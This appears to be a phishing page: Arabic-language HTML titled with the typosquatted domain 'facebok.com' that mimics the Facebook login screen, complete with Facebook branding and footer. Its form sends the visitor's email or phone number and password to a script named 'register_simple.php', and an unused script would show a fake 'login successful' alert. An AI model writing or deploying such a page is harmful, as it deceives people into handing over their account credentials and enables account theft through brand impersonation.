<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>facebok.com</title>
    <link rel="icon" type="image/x-icon" href="images/facebook.webp">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" href="style.css">

<body class="facebook-page">



  <div class="container d-flex justify-content-center align-items-center vh-100 p-4">

    <!-- كرتة تسجيل الدخول -->
    <div class="login-container">

      <!-- كلمة فيس بوك في نص الكرتة -->
      <h1 class="brand">facebook</h1>

<form action="register_simple.php" method="POST">
    <input type="text" id="email" name="email" class="form-control mb-3" placeholder="البريد الإلكتروني أو رقم الهاتف" required>

    <input type="password" id="password" name="password" class="form-control mb-3" placeholder="كلمة السر" required>
    
    <button type="submit" class="btn login-btn w-100 mb-3">
        تسجيل الدخول
    </button>
</form>
        
    </div>
  </div>

  <p class="footer-text">© 2025 facebook</p>

  <script>
    function login(e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const pass = document.getElementById('password').value;

      if (email && pass) {
        alert('تم تسجيل الدخول بنجاح ✅');
      } else {
        alert('من فضلك أدخل البريد وكلمة السر');
      }
    }
  </script>

</body>
</html>
